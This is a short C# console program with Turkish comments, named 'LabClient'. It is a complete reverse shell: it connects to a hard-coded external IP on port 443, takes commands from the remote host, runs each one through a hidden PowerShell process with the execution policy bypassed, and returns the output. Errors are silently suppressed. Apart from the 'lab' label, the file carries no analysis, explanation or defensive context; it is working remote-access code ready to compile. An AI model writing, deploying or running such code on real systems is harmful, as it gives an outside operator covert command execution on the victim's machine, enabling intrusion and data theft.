using System;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Text;

// Bu kod bir console application olarak derlenmelidir.
public class LabClient {
    public static void Main() {
        string targetIP = "185.194.175.132";
        int targetPort = 443;

        try {
            using (TcpClient client = new TcpClient(targetIP, targetPort)) {
                using (Stream stream = client.GetStream()) {
                    using (StreamReader reader = new StreamReader(stream)) {
                        using (StreamWriter writer = new StreamWriter(stream)) {
                            writer.AutoFlush = true;
                            writer.WriteLine("--- SESSION START ---");

                            while (true) {
                                writer.Write("SHELL> ");
                                string cmd = reader.ReadLine();
                                if (string.IsNullOrEmpty(cmd)) break;

                                // PowerShell'i arka planda (gizli) başlatır
                                Process p = new Process();
                                p.StartInfo.FileName = "powershell.exe";
                                p.StartInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command " + cmd;
                                p.StartInfo.UseShellExecute = false;
                                p.StartInfo.RedirectStandardOutput = true;
                                p.StartInfo.RedirectStandardError = true;
                                p.StartInfo.CreateNoWindow = true; // Pencere açmaz
                                p.Start();

                                string output = p.StandardOutput.ReadToEnd();
                                string error = p.StandardError.ReadToEnd();
                                writer.WriteLine(output + error);
                            }
                        }
                    }
                }
            }
        } catch { }
    }
}
